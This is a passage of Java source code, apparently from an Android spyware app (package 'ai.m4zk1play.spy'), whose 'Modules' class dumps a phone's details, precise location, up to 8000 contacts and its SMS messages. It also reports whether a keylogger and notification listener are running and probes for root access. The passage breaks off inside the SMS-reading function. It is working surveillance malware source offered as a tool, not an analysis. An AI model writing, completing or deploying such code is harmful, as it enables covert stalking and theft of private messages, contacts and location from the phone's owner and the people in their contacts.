package ai.m4zk1play.spy;

import android.annotation.SuppressLint;
import android.app.WallpaperManager;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.location.Location;
import android.location.LocationManager;
import android.media.AudioManager;
import android.net.ConnectivityManager;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.PowerManager;
import android.os.Vibrator;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.telephony.SmsManager;
import android.util.Base64;
import android.widget.Toast;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

/** Modul perangkat: dump, kontrol, utilitas. */
public final class Modules {

    public static final String FILE_AUTHORITY_SUFFIX = ".mzkfiles";

    public static JSONObject info(Context c) {
        JSONObject o = new JSONObject();
        try {
            o.put("brand", Build.BRAND);
            o.put("model", Build.MODEL);
            o.put("android", Build.VERSION.RELEASE);
            o.put("sdk", Build.VERSION.SDK_INT);
            o.put("battery", battery(c));
            o.put("charging", charging(c));
            o.put("ip", ip(c));
            o.put("notif", NotifListener.alive());
            o.put("keylog", KeylogService.alive());
            o.put("a11y", KeylogService.alive());
            o.put("can_write", Settings.System.canWrite(c));
            o.put("root", root());
        } catch (Exception ignored) {
        }
        return o;
    }

    public static int battery(Context c) {
        try {
            android.os.BatteryManager bm = (android.os.BatteryManager)
                    c.getSystemService(Context.BATTERY_SERVICE);
            return bm == null ? 0 : bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY);
        } catch (Exception e) {
            return 0;
        }
    }

    public static boolean charging(Context c) {
        try {
            Intent i = c.registerReceiver(null,
                    new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            int s = i == null ? -1 : i.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1);
            return s == android.os.BatteryManager.BATTERY_STATUS_CHARGING
                    || s == android.os.BatteryManager.BATTERY_STATUS_FULL;
        } catch (Exception e) {
            return false;
        }
    }

    @SuppressLint("MissingPermission")
    public static String ip(Context c) {
        try {
            WifiManager wm = (WifiManager) c.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            int i = wm == null ? 0 : wm.getConnectionInfo().getIpAddress();
            return String.format(Locale.US, "%d.%d.%d.%d",
                    i & 0xff, (i >> 8) & 0xff, (i >> 16) & 0xff, (i >> 24) & 0xff);
        } catch (Exception e) {
            return "";
        }
    }

    public static boolean root() {
        String out = Shell.exec("su -c id");
        return out != null && out.contains("uid=0");
    }

    public static JSONObject location(Context c) {
        JSONObject o = new JSONObject();
        try {
            LocationManager lm = (LocationManager) c.getSystemService(Context.LOCATION_SERVICE);
            Location best = null;
            for (String p : new String[]{LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER}) {
                try {
                    Location l = lm.getLastKnownLocation(p);
                    if (l != null && (best == null || l.getTime() > best.getTime())) best = l;
                } catch (Exception ignored) {
                }
            }
            if (best != null) {
                o.put("lat", best.getLatitude());
                o.put("lon", best.getLongitude());
                o.put("acc", best.getAccuracy());
                o.put("provider", best.getProvider());
            }
        } catch (Exception ignored) {
        }
        return o;
    }

    public static JSONArray contacts(Context c) {
        JSONArray arr = new JSONArray();
        try (android.database.Cursor cur = c.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                        ContactsContract.CommonDataKinds.Phone.NUMBER}, null, null, null)) {
            while (cur != null && cur.moveToNext() && arr.length() < 8000) {
                JSONObject o = new JSONObject();
                o.put("name", cur.getString(0));
                o.put("number", cur.getString(1));
                arr.put(o);
            }
        } catch (Exception ignored) {
        }
        return arr;
    }

    public static JSONArray sms(Context c) {
        JSONArray arr = new JSONArray();
        try (android.database.Cursor cur = c.getContentResolver().query(Uri.parse("content://sms"),
                new String[]{"address", "body", "date", "type"}, null, null, "date DESC")) {
            while (cur != null && cur.moveToNext() && arr.length() < 8000
